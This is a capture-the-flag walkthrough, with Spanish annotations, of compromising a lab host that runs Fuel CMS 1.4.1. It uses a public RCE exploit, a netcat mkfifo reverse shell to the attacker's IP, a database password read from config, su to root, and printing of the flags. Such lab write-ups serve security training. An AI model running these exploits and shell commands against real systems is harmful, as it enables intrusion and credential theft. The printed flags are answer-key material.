
## Recon
```
nmap -sV -n -Pn 10.10.97.81 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 20:07 CDT
Nmap scan report for 10.10.97.81
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds


```

```
http://10.10.97.81/robots.txt
User-agent: *
Disallow: /fuel/
```

```
searchsploit fuel cms 1.4
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                 | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                 | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                 | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)       | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenti | php/webapps/48778.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
python3 50477.py -u http://10.10.97.81/
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)


Enter Command $

```

- Estando adentro vemos si podemos comunicarnos con el sistema kali

```
ping -c1 10.2.4.107
systemPING 10.2.4.107 (10.2.4.107) 56(84) bytes of data.
64 bytes from 10.2.4.107: icmp_seq=1 ttl=61 time=238 ms

--- 10.2.4.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 238.118/238.118/238.118/0.000 ms


sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:23:41.356934 IP 10.10.97.81 > 10.2.4.107: ICMP echo request, id 2036, seq 1, length 64
20:23:41.356978 IP 10.2.4.107 > 10.10.97.81: ICMP echo reply, id 2036, seq 1, length 64
20:23:41.565358 IP 10.10.97.81 > 10.2.4.107: ICMP echo request, id 2038, seq 1, length 64


```

- reverse shell
```
python3 50477.py -u http://10.10.97.81/
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.4.107 7789 >/tmp/f


rlwrap nc -lnvp 7789
listening on [any] 7789 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.97.81] 40330
sh: 0: can't access tty; job control turned off
$ 




```


```
http://10.10.97.81/fuel/login

admin
admin
```


```
$ pwd
/var/www/html/fuel/application/config
$ less database.php


$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE

```

```
rlwrap nc -lnvp 7789
listening on [any] 7789 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.97.81] 40350
sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ 
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html$ 

www-data@ubuntu:/var/www/html$ 


```

```
www-data@ubuntu:/var/www/html$ su root
su root
Password: mememe

id
id
root@ubuntu:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/var/www/html# ls                         ls
ls
assets  composer.json  contributing.md  fuel  index.php  README.md  robots.txt
root@ubuntu:/var/www/html# cd /root                   cd /root
cd /root
root@ubuntu:~# ls             ls
ls
root.txt
root@ubuntu:~# cat root.txt   cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

```
$ cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b 
```